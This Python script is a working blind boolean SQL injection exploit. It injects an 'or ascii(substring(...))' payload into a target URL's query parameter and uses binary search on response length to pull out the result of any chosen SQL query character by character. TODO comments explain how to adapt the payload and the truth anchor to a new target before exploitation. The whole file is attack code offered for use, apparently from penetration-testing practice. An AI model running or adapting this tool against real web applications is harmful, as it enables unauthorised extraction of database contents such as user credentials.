#!/usr/bin/python

# TODOS before exploitation (search for TODO in this file): 
# change 1. truth anchor (could be content length as indicator or specific string in response f.e.), 2. inj_str less and equal, boolean query that leads to sqli
# Note regarding payload, try with concat (group_concat) function when selecting if payload fails

import requests
import sys

# checkCharAgainstTarget function has to return true if boolean equation is true - make sure that truth anchor is set correctly
def checkCharAgainstTarget(target):
	r = requests.get(target)
	content_length = int(r.headers['Content-Length'])
	 # TODO 1: CHANGE TRUTH ANCHOR ACCORDING TO TARGET SUCCESS RESPONSE
	if(content_length > 20):
		return True
	return False

# using binary search -> max 8 requests/chr (8th bcs could be None)
def binarySearchFindChar(url, inj_str_less,inj_str_equal):
    mid = 0
    start = 32 # ascii start
    end = 126 # ascii end

    while(True):
        mid = (start + end) // 2
        payload_less = "%s%s" % (url, inj_str_less.replace("[CHAR]", str(mid)))         
        
	# binary search anchor
        if ((end - start) <= 1):
            payload_equal_start = "%s%s" % (url, inj_str_equal.replace("[CHAR]", str(start)))
            payload_equal_end = "%s%s" % (url, inj_str_equal.replace("[CHAR]", str(end)))
            if(checkCharAgainstTarget(payload_equal_start)):
                return chr(start)
            elif(checkCharAgainstTarget(payload_equal_end)):
                return chr(end)
            return None # character not found, probably end of string reached
	elif(checkCharAgainstTarget(payload_less)):
            end = mid - 1
        else:
            start = mid

def main():
    if len(sys.argv) != 3:
        print("(+) usage: %s <targetUrl> <cleanSubQuery>"  % sys.argv[0])
        print('(+) eg: %s \'http://192.168.121.103/vulnerable.php?q=\' \'SELECT user()\''  % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    cleanSubQuery = sys.argv[2]
    print("(+) Retrieving results for following Query:")
    print(cleanSubQuery)
    loot = ""
    # set length according to target (if known beforehand, otherwise use high number)
    for i in range(1, 500):
        # TODO 2: CHANGE THIS INJ_STR ACCORDING TO TARGET VULN
        inj_str_less = "test')/**/or/**/(ascii(substring((%s),%d,1)))<[CHAR]%%23" % (cleanSubQuery,i)
        inj_str_equal = "test')/**/or/**/(ascii(substring((%s),%d,1)))=[CHAR]%%23" % (cleanSubQuery,i)
        extracted_char = binarySearchFindChar(url, inj_str_less, inj_str_equal)
        if extracted_char == None:
            print("\n (+) All chars received")
            break
        loot+=extracted_char
        sys.stdout.write(extracted_char)
        sys.stdout.flush()
    print(loot)
    print("\n(+) done!")

if __name__ == "__main__":
    main()
